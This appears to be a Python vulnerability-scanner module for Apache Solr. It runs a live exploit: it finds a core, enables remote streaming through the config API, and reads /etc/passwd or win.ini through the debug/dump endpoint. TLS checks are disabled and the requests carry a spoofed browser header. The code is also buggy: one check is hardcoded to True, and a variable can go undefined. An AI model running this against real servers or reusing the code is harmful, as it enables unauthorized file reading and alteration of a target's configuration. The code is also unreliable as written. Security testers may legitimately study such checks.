import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"solr/admin/cores?indexInfo=false&wt=json"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "responseHeader" in response.text:
		linux0=True
		try:
			core=re.findall("\"name\":\"(.+?)\",",response.text)[0]
			# print(core)
		except:
			core=''
	else:
		linux0=False
	url=baseurl+f"solr/{core}/config"
	body='{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if "responseHeader" in response.text:
		linux1=True
	else:
		linux1=False
	url=baseurl+f"solr/{core}/debug/dump?param=ContentStreams"
	body="stream.url=file:///etc/passwd"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "root:" in response.text:
		linux2=True
	else:
		linux2=False
	url=baseurl+"solr/admin/cores?indexInfo=false&wt=json"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if True:
		windows0=True
	else:
		windows0=False
	url=baseurl+f"solr/{core}/config"
	body='{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if "responseHeader" in response.text:
		windows1=True
	else:
		windows1=False
	url=baseurl+f"solr/{core}/debug/dump?param=ContentStreams"
	body="stream.url=file:///c://windows/win.ini"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "for 16-bit app support" in response.text:
		windows2=True
	else:
		windows2=False
	if (linux0 and linux1 and linux2) or (windows0 and windows1 and windows2):
		return True
	else:
		return False
